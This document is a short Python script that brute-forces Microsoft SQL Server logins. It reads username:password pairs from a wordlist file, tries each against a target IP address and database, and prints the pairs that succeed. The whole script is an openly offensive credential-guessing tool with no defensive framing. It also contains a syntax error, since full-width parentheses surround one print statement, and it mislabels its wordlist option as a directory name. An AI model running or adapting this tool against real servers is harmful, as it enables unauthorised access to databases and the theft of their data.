import pymssql
import optparse


def connectdatabase(filename,ip,dbname):
	with open(filename) as f:
		for content in f.readlines():
			allcontent = content.replace('\n','')
			result = allcontent.split(':')
			username = result[0]
			password = result[1]
			try:
				conn = pymssql.connect(host=ip,user=username,password=password,database=dbname)
				print （'[+] %s %s is right' % (username,password)）
			except:
				pass

def main():
	parser = optparse.OptionParser(usage='-m directoryname -i ipaddress -d databasename')
	parser.add_option('-m',dest='directoryname',type='string',help='specify target directoryname')
	parser.add_option('-i',dest='ipaddress',type='string',help='specify ipaddress')
	parser.add_option('-d',dest='databasename',type='string',help='specify databasename')
	options,args=parser.parse_args()
	dname = options.directoryname
	ip = options.ipaddress
	dbname = options.databasename
	if dname and ip and dbname:
		connectdatabase(dname,ip,dbname)
	else:
		print parser.usage

if __name__ == '__main__':
	main()